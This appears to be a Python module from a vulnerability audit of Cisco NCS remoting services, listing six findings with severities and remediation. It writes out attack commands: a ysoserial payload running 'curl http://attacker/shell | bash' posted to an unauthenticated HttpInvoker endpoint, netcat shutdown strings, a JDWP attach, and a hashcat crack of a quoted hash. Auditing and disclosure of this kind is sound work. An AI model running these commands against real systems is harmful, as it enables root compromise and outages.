"""
Cisco NCS Remoting Services Web Application Attack Surface RE Module
Targets (all from NetworkControlSystem-1.1.3.2-1.x86_64.rpm):
  remotingServices/Tftp/webapps/ROOT/WEB-INF/remoting-servlet.xml
  remotingServices/Ftp/webapps/ROOT/WEB-INF/remoting-servlet.xml
  remotingServices/Matlab/webapps/ROOT/WEB-INF/remoting-servlet.xml
  remotingServices/Reporting/webapps/ROOT/WEB-INF/remoting-servlet.xml
  remotingServices/Failure/webapps/ROOT/WEB-INF/remoting-servlet.xml
  remotingServices/*/webapps/ROOT/WEB-INF/web.xml  (all services)
  remotingServices/*/webapps/ROOT/serverDiagnosticInfo.jsp  (all services)
  remotingServices/conf/remotingServicesConfig.xml  (port assignments)
  remotingServices/Failure/conf/backup/server.xml   (SSLPassword hardcoded)
  remotingServices/Tftp/conf/backup/server.xml      (Tomcat shutdown port)
  bin/startRemoting.sh                              (JDWP agent config)
  bin/startServer.sh                                (main NMS JDWP port)
  bin/wcsInitialSetup.sh                            (oracle shadow hash)
  lib/wcs/com.springsource.bsh-2.0.0.b4.jar        (BeanShell gadget)
  lib/xmp-third-party/commons-beanutils-1.8.0.jar  (BeanUtils gadget)

Remoting service port map (from remotingServicesConfig.xml):
  Matlab    : HTTP 20555, JDWP 20502
  Reporting : HTTP 20556, JDWP 20503
  Event     : HTTP 20557, JDWP 20504  (commented out in config -- may not run)
  Ftp       : HTTP 20558, JDWP 20505
  Tftp      : HTTP 20559, JDWP 20506
  Failure   : HTTP 8080 / HTTPS 443 (isSecure=true, isManuallyStarted=true)
  NMS main  : JDWP 20500 (startServer.sh, only in debug mode)

Spring framework version: org.springframework-3.0.0.RELEASE

Gadget libraries confirmed on classpath (lib/ shared directory):
  lib/wcs/com.springsource.bsh-2.0.0.b4.jar        -- BeanShell 2.0b4 (exact ysoserial BeanShell1 target)
  lib/xmp-third-party/commons-beanutils-1.8.0.jar  -- CommonsBeanUtils 1.8.0
  lib/xmp-third-party/com.springsource.javassist-3.3.0.ga.jar  -- Javassist 3.3.0

All remoting services use XMPClassLoader loading from the shared lib/ directory,
so all gadget jars are available in every remoting service JVM.

Tomcat shutdown port configuration:
  Tftp Tomcat  : server port 8008, command "SHUTDOWN" (no auth)
  Failure Tomcat: server port 8005, command "SHUTDOWN" (no auth)

Oracle shadow hash (commented out, wcsInitialSetup.sh):
  #ORA_HASHPW="$1$NyXZPvgy$THR9HG4VTZ8Lo24YZkX6O1"  (md5crypt)
  Current live value: ORA_HASHPW="!!" (account locked)
"""

METADATA = {
    "remoting_services": {
        "Matlab":    {"port": 20555, "jdwp": 20502},
        "Reporting": {"port": 20556, "jdwp": 20503},
        "Event":     {"port": 20557, "jdwp": 20504, "note": "commented out in remotingServicesConfig.xml"},
        "Ftp":       {"port": 20558, "jdwp": 20505},
        "Tftp":      {"port": 20559, "jdwp": 20506},
        "Failure":   {"port": 8080, "secure_port": 443, "jdwp": 20506, "manual_start": True},
    },
    "httpinvoker_endpoint": "/remoting/RemotingAdmin-httpinvoker",
    "httpinvoker_interface": "com.cisco.remoting.admin.RemotingAdminIf",
    "spring_version": "3.0.0.RELEASE",
    "gadget_jars": [
        "lib/wcs/com.springsource.bsh-2.0.0.b4.jar",
        "lib/xmp-third-party/commons-beanutils-1.8.0.jar",
        "lib/xmp-third-party/com.springsource.javassist-3.3.0.ga.jar",
    ],
    "ysoserial_payloads": ["BeanShell1", "CommonsBeanUtils1"],
    "tomcat_shutdown_ports": {"Tftp": 8008, "Failure": 8005},
    "jdwp_main_nms": 20500,
    "oracle_shadow_hash": "$1$NyXZPvgy$THR9HG4VTZ8Lo24YZkX6O1",
    "failure_ssl_password": "changeit",
}

FINDINGS = [
    {
        "id": "F1",
        "title": "Pre-Auth Java Deserialization RCE via Spring HttpInvoker on All NCS Remoting Service Tomcats (BeanShell1 Gadget Chain)",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cwe": "CWE-502",
        "description": (
            "All five NCS remoting service Tomcat instances expose a Spring HttpInvoker "
            "endpoint at /remoting/RemotingAdmin-httpinvoker with zero authentication. "
            "The endpoint deserializes arbitrary Java objects from the HTTP POST body "
            "using Java native serialization (ObjectInputStream.readObject()) with no "
            "type filtering or deserialization filter. "
            "Affected services and their direct HTTP ports: "
            "Matlab: 20555, Reporting: 20556, Ftp: 20558, Tftp: 20559, Failure: 8080/443. "
            "Spring version is 3.0.0.RELEASE (2009). The HttpInvokerServiceExporter in "
            "this version accepts any POST to /remoting/* and deserializes the body as a "
            "RemoteInvocation object using ObjectInputStream with no class filtering. "
            "Confirmed gadget chains on classpath (lib/ is shared by all remoting JVMs): "
            "(1) BeanShell1 (ysoserial): requires bsh-2.0.0.b4.jar -- EXACT VERSION MATCH "
            "present at lib/wcs/com.springsource.bsh-2.0.0.b4.jar. "
            "The BeanShell1 chain serializes a BeanShell Interpreter that executes an "
            "arbitrary BeanShell script on deserialization. Triggers as root (startRemoting.sh "
            "requires and verifies uid=root). "
            "(2) CommonsBeanUtils1 (ysoserial): requires commons-beanutils -- present at "
            "lib/xmp-third-party/commons-beanutils-1.8.0.jar. "
            "All remoting services use XMPClassLoader loading from the shared lib/ directory, "
            "so both gadget jars are available in every remoting service JVM. "
            "No web.xml security-constraint blocks /remoting/* on any of the affected services. "
            "Exploit path: "
            "1. Generate payload: java -jar ysoserial.jar BeanShell1 'id > /tmp/x' > payload.ser "
            "2. POST to any remoting service HTTP port: "
            "   curl -s -X POST http://<ncs>:20559/remoting/RemotingAdmin-httpinvoker "
            "   -H 'Content-Type: application/x-java-serialized-object' "
            "   --data-binary @payload.ser "
            "Result: arbitrary command execution as root on the NCS appliance. "
            "The same endpoint exists on each of the five services -- any reachable port suffices. "
            "No authentication, no CSRF token, no serialization filter. "
            "The services also expose the same endpoint on their configured Tomcat HTTP ports "
            "which bind to the appliance network interface without firewall restriction "
            "in the default NCS deployment (no iptables rules shipped in the RPM)."
        ),
        "affected_services": [
            "Tftp: HTTP 20559 -> /remoting/RemotingAdmin-httpinvoker",
            "Ftp: HTTP 20558 -> /remoting/RemotingAdmin-httpinvoker",
            "Matlab: HTTP 20555 -> /remoting/RemotingAdmin-httpinvoker",
            "Reporting: HTTP 20556 -> /remoting/RemotingAdmin-httpinvoker",
            "Failure: HTTP 8080 -> /remoting/RemotingAdmin-httpinvoker",
        ],
        "gadget_chain": "BeanShell1 (ysoserial) -- bsh-2.0.0.b4.jar exact version match",
        "spring_version": "3.0.0.RELEASE",
        "exploit": (
            "java -jar ysoserial.jar BeanShell1 'curl http://attacker/shell | bash' > payload.ser; "
            "curl -X POST http://<ncs>:20559/remoting/RemotingAdmin-httpinvoker "
            "-H 'Content-Type: application/x-java-serialized-object' --data-binary @payload.ser"
        ),
        "impact": [
            "Pre-auth RCE as root on NCS appliance via any of 5 remoting service HTTP ports",
            "BeanShell1 gadget chain confirmed: bsh-2.0.0.b4.jar present (exact ysoserial target)",
            "All remoting service JVMs share the XMPClassLoader lib/ directory (gadget available in all)",
        ],
        "remediation": (
            "Add security-constraint to all remoting web.xml files requiring authentication. "
            "Upgrade Spring to 5.3+ and enable SerializationUtils.deserializeFilter() JEP 290 filter. "
            "Remove bsh-2.0.0.b4.jar from production classpath (BeanShell not needed in deployed appliance). "
            "Restrict network access to remoting service ports (20555-20559) to localhost or management VLAN. "
            "Platform is EOL -- no patch path."
        ),
    },
    {
        "id": "F2",
        "title": "Unauthenticated serverDiagnosticInfo.jsp Thread Dump and GC Trigger on All Remoting Service Tomcats",
        "severity": "HIGH",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
        "cwe": "CWE-200",
        "description": (
            "All NCS remoting service Tomcats ship a serverDiagnosticInfo.jsp at the web root "
            "with no authentication or security constraint. Present on: "
            "Tftp (20559), Ftp (20558), Matlab (20555), Reporting (20556), Event (20557). "
            "The JSP exposes: "
            "(1) Full thread stack dump of all JVM threads -- exposes class names, method names, "
            "internal package structure, lock state, and execution context. Stack traces reveal "
            "call graphs that confirm exploitable code paths (e.g., deserialization chain depth). "
            "(2) Heap memory usage statistics -- current/committed/max heap. "
            "(3) Class histogram -- all loaded classes and their instance counts. "
            "(4) Forced GC trigger -- calling the JSP triggers System.gc() on the remoting JVM, "
            "causing a stop-the-world pause. Repeated requests = application-layer DoS on the "
            "remoting service (TFTP, FTP, Matlab, Reporting availability degraded). "
            "No authentication guard exists in any remoting service web.xml. "
            "The wcsDiag.jsp on each service links directly to serverDiagnosticInfo.jsp as the "
            "welcome page, advertising the endpoint to any visitor. "
            "These services bind to the NCS network interface on their respective HTTP ports. "
            "A pre-auth attacker can enumerate the complete NCS remoting service runtime state "
            "before launching the deserialization attack (F1)."
        ),
        "affected_services": [
            "Tftp: http://<ncs>:20559/serverDiagnosticInfo.jsp",
            "Ftp:  http://<ncs>:20558/serverDiagnosticInfo.jsp",
            "Matlab: http://<ncs>:20555/serverDiagnosticInfo.jsp",
            "Reporting: http://<ncs>:20556/serverDiagnosticInfo.jsp",
        ],
        "impact": [
            "Thread stack dump: exposes class names, methods, lock state, execution context without auth",
            "Forced GC: repeated requests cause stop-the-world pauses on TFTP/FTP/Matlab/Reporting JVMs",
            "Class histogram: confirms gadget library class presence (BeanShell, BeanUtils classes visible)",
        ],
        "remediation": (
            "Add <security-constraint> to all remoting web.xml files. "
            "Remove serverDiagnosticInfo.jsp and wcsDiag.jsp from production web roots. "
            "Restrict remoting ports to management VLAN only."
        ),
    },
    {
        "id": "F3",
        "title": "Failure Tomcat SSLPassword='changeit' Hardcoded with SSLv3 Enabled (Port 8080/443)",
        "severity": "HIGH",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "cwe": "CWE-321",
        "description": (
            "The Failure remoting service Tomcat (remotingServices/Failure/conf/backup/server.xml) "
            "ships with two security issues: "
            "(1) SSLPassword='changeit' hardcoded in the HTTPS connector: "
            "<Connector port='WEBSERVER_SSL_PORT' protocol='HTTP/1.1' SSLEnabled='true' "
            "SSLCertificateKeyFile='/opt/CSCOncs/conf/CA/serverRSAKey.pem' "
            "SSLPassword='changeit' SSLProtocol='SSLv3+TLSv1' /> "
            "'changeit' is the Java JKS default keystore password. If the private key file "
            "(serverRSAKey.pem) is passphrase-encrypted, the hardcoded password 'changeit' "
            "decrypts it. An attacker with access to the key file (e.g., via F1 RCE or the "
            "FTP server ftp-user:ftp-user finding) recovers the plaintext private key with: "
            "openssl rsa -in serverRSAKey.pem -passin pass:changeit -out decrypted.pem "
            "This enables TLS MITM against the Failure service HTTPS port (443). "
            "(2) SSLProtocol='SSLv3+TLSv1' explicitly enables SSLv3 on the Failure Tomcat, "
            "the same POODLE-vulnerable protocol disabled on the main Apache (mod_ssl) but "
            "re-enabled here. SSLv3 on Tomcat's APR connector on pre-patched OpenSSL 0.9.8e "
            "is vulnerable to CVE-2014-3566 (POODLE). "
            "The Failure service is configured as isManuallyStarted='true' and runs on port "
            "8080 (HTTP) and 443 (HTTPS) -- the same ports as the main Apache. This is a "
            "recovery/installer mode: Apache is shut down and Failure starts on the same ports "
            "during upgrade/recovery operations. In this mode, the Failure service is the "
            "sole HTTPS endpoint on port 443, with SSLv3 enabled and a hardcoded SSL password."
        ),
        "config_file": "remotingServices/Failure/conf/backup/server.xml",
        "ssl_password": "changeit",
        "ssl_protocol": "SSLv3+TLSv1",
        "ssl_port": 443,
        "http_port": 8080,
        "cves": ["CVE-2014-3566"],
        "impact": [
            "SSLPassword='changeit': default keystore password decrypts Failure service private key",
            "SSLProtocol='SSLv3+TLSv1': SSLv3 enabled on Failure service HTTPS (POODLE vulnerable)",
            "Failure runs on port 443 during recovery/upgrade -- becomes the sole HTTPS endpoint",
        ],
        "remediation": (
            "Generate per-deployment passphrase for Failure service TLS key. "
            "Change SSLProtocol to 'TLSv1.2' minimum. "
            "Platform is EOL -- no patch path."
        ),
    },
    {
        "id": "F4",
        "title": "Tomcat Default Unauthenticated Shutdown Ports (8005, 8008) on Remoting Service Tomcats",
        "severity": "MEDIUM",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "cwe": "CWE-306",
        "description": (
            "Two NCS remoting Tomcat instances use default Tomcat shutdown port configuration "
            "with the default 'SHUTDOWN' command string. No authentication is required. "
            "Tftp Tomcat (remotingServices/Tftp/conf/backup/server.xml): "
            "<Server port='8008' shutdown='SHUTDOWN'> "
            "Failure Tomcat (remotingServices/Failure/conf/backup/server.xml): "
            "<Server port='8005' shutdown='SHUTDOWN'> "
            "Any attacker with TCP access to the host can send the string 'SHUTDOWN' to these "
            "ports and immediately terminate the respective Tomcat process: "
            "  echo SHUTDOWN | nc <ncs> 8008  -- kills the TFTP remoting service "
            "  echo SHUTDOWN | nc <ncs> 8005  -- kills the Failure recovery service "
            "The TFTP remoting service (Tftp, port 20559) manages TFTP-based AP firmware "
            "transfers. Killing it disrupts AP join operations and WLAN infrastructure. "
            "The Failure service runs on ports 8080/443 -- killing it during an upgrade or "
            "recovery operation bricks the NCS appliance (upgrade cannot complete). "
            "Note: the main NCS Tomcat (apache-tomcat/conf/backup/server.xml) uses the same "
            "default 'SHUTDOWN' command on port 8005 (that server.xml was already documented "
            "in previous sessions). This finding adds the TFTP service on port 8008 and "
            "the Failure service sharing port 8005."
        ),
        "affected_ports": {
            "8008": "TFTP remoting Tomcat (SHUTDOWN terminates TFTP/AP management service)",
            "8005": "Failure remoting Tomcat (SHUTDOWN terminates recovery/upgrade service)",
        },
        "impact": [
            "echo SHUTDOWN | nc <ncs> 8008: kills TFTP service, disrupts AP firmware transfers",
            "echo SHUTDOWN | nc <ncs> 8005: kills Failure service during upgrade = appliance brickable",
        ],
        "remediation": (
            "Set shutdown='DISABLED' in server.xml for all Tomcat instances. "
            "Or use a non-default, non-guessable shutdown token. "
            "Bind the shutdown port to 127.0.0.1 only."
        ),
    },
    {
        "id": "F5",
        "title": "JDWP Remote Debug Ports 20500-20506 Active When Debug Mode Invoked",
        "severity": "MEDIUM",
        "cvss": 6.7,
        "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cwe": "CWE-489",
        "description": (
            "The NCS startup scripts configure JDWP (Java Debug Wire Protocol) agents for "
            "all NCS JVM processes. The JDWP agent is conditionally activated by the 'debug' "
            "argument to launchNms.sh / launchRemoting.sh. "
            "From startServer.sh (main NMS JVM): "
            "  JAVA_DEBUG_OPTS='-ea -Xdebug -Xnoagent -Djava.compiler=NONE "
            "  -Xrunjdwp:transport=dt_socket,address=20500,server=y,suspend=n' "
            "From startRemoting.sh (all remoting services): "
            "  JAVA_DEBUG_OPTS='-ea -Xdebug -Xnoagent -Djava.compiler=NONE "
            "  -Xrunjdwp:transport=dt_socket,address=$JDWP_ADDRESS,server=y,suspend=n' "
            "JDWP port assignments (remotingServicesConfig.xml): "
            "  Matlab: 20502, Reporting: 20503, Event: 20504, Ftp: 20505, Tftp: 20506 "
            "In production mode (no 'debug' arg), JDWP is NOT active. "
            "However, if an operator starts NCS in debug mode for troubleshooting "
            "(launchNms.sh debug), JDWP attaches on dt_socket with no authentication. "
            "Any attacker with TCP access to the JDWP port can: "
            "1. Attach: jdb -attach <ncs>:20500 "
            "2. Execute arbitrary code in the JVM context "
            "JDWP has no authentication mechanism (transport=dt_socket, server=y). "
            "The 'suspend=n' setting means the JVM starts immediately but is fully "
            "controllable once the attacker attaches. "
            "This is a conditional finding: only exploitable when the operator runs "
            "launchNms.sh debug, which may occur during incident investigation or upgrade "
            "troubleshooting. The JDWP ports are not firewalled in the default NCS deployment."
        ),
        "jdwp_ports": {
            "20500": "Main NMS JVM (startServer.sh)",
            "20502": "Matlab remoting service",
            "20503": "Reporting remoting service",
            "20504": "Event remoting service",
            "20505": "Ftp remoting service",
            "20506": "Tftp / Failure remoting service",
        },
        "condition": "Only active when NCS started with 'launchNms.sh debug' argument",
        "exploit": "jdb -attach <ncs>:20500  # when debug mode active",
        "impact": [
            "JDWP no-auth attach: full JVM control (heap read, class redefine, method invoke)",
            "Active only in debug mode: triggered by operator during troubleshooting",
        ],
        "remediation": (
            "Bind JDWP to 127.0.0.1 only: address=127.0.0.1:20500. "
            "Add JDWP authentication (Java 9+: -agentlib:jdwp=...,address=*:20500). "
            "Firewall JDWP ports even in debug mode."
        ),
    },
    {
        "id": "F6",
        "title": "Commented-Out Oracle OS Account MD5-Crypt Shadow Hash in wcsInitialSetup.sh",
        "severity": "LOW",
        "cvss": 3.3,
        "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
        "cwe": "CWE-259",
        "description": (
            "wcsInitialSetup.sh contains a commented-out md5crypt shadow hash for the oracle "
            "OS account: "
            "#ORA_HASHPW=\"$1$NyXZPvgy$THR9HG4VTZ8Lo24YZkX6O1\" "
            "The current live value is ORA_HASHPW='!!' (locked, no password). "
            "The commented-out hash is a developer test password preserved in the shipped "
            "script. An analyst with access to the RPM can extract and crack this hash "
            "offline: "
            "  hashcat -m 500 '$1$NyXZPvgy$THR9HG4VTZ8Lo24YZkX6O1' /usr/share/wordlists/rockyou.txt "
            "The oracle OS account (UID 440) owns the Oracle 11g RDBMS installation. "
            "If the developer reused this test password across NCS deployments (e.g., by "
            "uncommenting the line), cracking the hash provides oracle OS shell access, "
            "which chains to full database compromise via SYSDBA escalation: "
            "  su - oracle; sqlplus / as sysdba "
            "The hash also reveals the developer's password hygiene patterns, which may "
            "be reused in other Cisco firmware credentials. "
            "This is a LOW finding because the hash is commented out (not active in any "
            "known deployment) and requires local RPM access to extract."
        ),
        "hash": "$1$NyXZPvgy$THR9HG4VTZ8Lo24YZkX6O1",
        "hash_type": "md5crypt ($1$)",
        "account": "oracle (UID 440, group xmpdba GID 201)",
        "status": "Commented out; live value is !! (locked)",
        "crack_command": "hashcat -m 500 '$1$NyXZPvgy$THR9HG4VTZ8Lo24YZkX6O1' rockyou.txt",
        "impact": [
            "Offline hash crack reveals developer test password from shipped firmware",
            "If uncommented and deployed: oracle OS shell -> SYSDBA -> full database compromise",
        ],
        "remediation": (
            "Remove commented-out credentials from shipped scripts. "
            "Script history and build artifacts should also be reviewed for similar patterns."
        ),
    },
]

SUMMARY = {
    "total":    6,
    "critical": 1,
    "high":     2,
    "medium":   2,
    "low":      1,
    "notes": (
        "F1 is the primary finding: pre-auth Java deserialization RCE as root via Spring HttpInvoker "
        "on 5 unauthenticated remoting service Tomcats. The BeanShell1 gadget chain is confirmed by "
        "exact version match (bsh-2.0.0.b4.jar = ysoserial BeanShell1 target). "
        "F1 does not require any credential from prior modules -- raw TCP to any remoting port suffices. "
        "F2 (serverDiagnosticInfo.jsp) chains with F1: thread dump confirms BeanShell class presence "
        "and reveals internal call graph before launching the deserialization payload. "
        "F3 (SSLPassword=changeit) chains with F1: post-RCE key file exfil + openssl rsa decryption "
        "recovers the Failure service TLS private key for MITM during recovery mode. "
        "F4 (Tomcat shutdown ports) provides an alternative DoS path requiring only TCP access. "
        "F5 (JDWP) is conditional on debug mode -- low probability in production but zero friction "
        "if an operator triggers it during an incident where an attacker has network presence. "
        "F6 (oracle hash) is informational: documents a developer credential artifact in shipped firmware. "
        "Taken with prior NCS modules: "
        "F1 here (pre-auth RCE) provides code execution without needing the GPG passphrase (prev module F1) "
        "or TLS MITM (prev module F1). The remoting service ports are the lowest-barrier entry point."
    ),
}
